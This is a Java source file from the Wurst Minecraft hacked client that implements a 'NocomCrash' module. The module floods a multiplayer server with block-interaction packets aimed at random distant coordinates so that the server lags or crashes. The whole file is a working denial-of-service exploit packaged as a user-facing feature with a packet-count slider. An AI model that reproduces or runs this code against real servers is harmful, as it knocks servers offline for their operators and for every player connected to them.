/*
 * Copyright (c) 2014-2023 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import java.text.NumberFormat;
import java.util.Locale;
import java.util.Random;

import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.settings.SliderSetting;
import net.wurstclient.settings.SliderSetting.ValueDisplay;
import net.wurstclient.util.ChatUtils;

@SearchTags({"nocom crash", "ServerCrasher", "server crasher", "ServerLagger",
	"server lagger"})
public final class NocomCrashHack extends Hack
{
	private final Random random = new Random();
	
	private final SliderSetting packets =
		new SliderSetting("Packets", "The number of packets to send.", 500, 1,
			1000, 1, ValueDisplay.INTEGER);
	
	public NocomCrashHack()
	{
		super("NocomCrash");
		setCategory(Category.OTHER);
		addSetting(packets);
	}
	
	@Override
	public void onEnable()
	{
		String seconds = NumberFormat.getNumberInstance(Locale.ENGLISH)
			.format(packets.getValueI() / 100.0);
		ChatUtils.message(
			"Sending packets. Will take approximately " + seconds + "s.");
		
		Thread thread = new Thread(() -> {
			
			try
			{
				sendPackets(packets.getValueI());
				ChatUtils.message("Done sending, server should start to lag");
				
			}catch(Exception e)
			{
				e.printStackTrace();
				ChatUtils.error("Failed to crash, caught "
					+ e.getClass().getSimpleName() + ".");
			}
			setEnabled(false);
			
		}, "NocomCrash");
		
		thread.start();
	}
	
	public void sendPackets(int nPackets) throws InterruptedException
	{
		for(int i = 0; i < nPackets; i++)
		{
			// display current packet
			if(i % 100 == 0 || i == nPackets)
				ChatUtils.message(String.format("%d/%d", i, nPackets));
			
			if(MC.getNetworkHandler() == null)
				break;
			
			Thread.sleep(10);
			
			// generate and send the packet
			PlayerInteractBlockC2SPacket packet = createNocomPacket();
			MC.getNetworkHandler().sendPacket(packet);
		}
	}
	
	public PlayerInteractBlockC2SPacket createNocomPacket()
	{
		Vec3d pos = pickRandomPos();
		BlockHitResult blockHitResult =
			new BlockHitResult(pos, Direction.DOWN, new BlockPos(pos), false);
		
		return new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, blockHitResult);
	}
	
	private Vec3d pickRandomPos()
	{
		int x = random.nextInt(16777215);
		int y = 255;
		int z = random.nextInt(16777215);
		
		return new Vec3d(x, y, z);
	}
}
